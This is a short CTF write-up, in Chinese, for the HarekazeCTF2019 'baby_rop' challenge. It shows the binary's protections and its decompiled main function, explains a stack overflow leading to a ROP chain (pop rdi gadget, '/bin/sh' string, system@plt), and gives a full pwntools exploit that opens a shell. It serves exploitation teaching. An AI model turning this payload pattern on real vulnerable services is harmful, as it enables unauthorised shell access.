## [HarekazeCTF2019]baby_rop

## 保护

```shell
$ checksec --file=babyrop
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



## main函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  system("echo -n \"What's your name? \"");
  __isoc99_scanf("%s", v4);
  printf("Welcome to the Pwn World, %s!\n", v4);
  return 0;
}
```







## EXP

思路：

v4可以栈溢出

Shift+F11发现`/bin/sh`，main函数中又有system函数

使用ROPgadget寻找`pop rdi;ret`

先用16个A覆盖栈，然后8个A覆盖saved rbp，然后填入`pop rdi;ret`的地址，然后传入/bin/sh的地址，使`/bin/sh`作为参数传入rdi，最后返回地址填入system函数的plt表地址，等待？之后发送payload，最后打开交互

最后`find / -name flag` 查找flag

```python
from pwn import *
r=process('./babyrop')

sys_addr=0x400490
bin_sh_addr=0x0601048
pop_rdi_addr=0x0400683

payload=b'A'*16+b'A'*8+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)
r.recvuntil('?')
r.sendline(payload)
r.interactive()
```

